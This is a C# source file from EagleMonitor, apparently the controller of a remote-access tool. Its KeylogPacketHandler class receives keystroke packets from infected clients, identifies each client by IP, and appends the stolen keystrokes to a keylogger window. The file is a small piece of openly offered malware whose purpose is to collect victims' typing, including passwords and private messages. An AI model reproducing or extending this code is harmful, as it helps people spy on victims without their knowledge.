using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class KeylogPacketHandler
    {
        public KeylogPacketHandler(KeylogPacket keylogPacket, ClientHandler clientHandler) 
        {
            //client handler not from list !!!!!
            try
            {
                ClientHandler.ClientHandlersList[keylogPacket.baseIp].keyloggerForm.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[keylogPacket.baseIp].keyloggerForm.hasAlreadyConnected = true;
                    ClientHandler.ClientHandlersList[keylogPacket.baseIp].keyloggerForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);               
                }));
            }
            catch { }
        }
    }
}
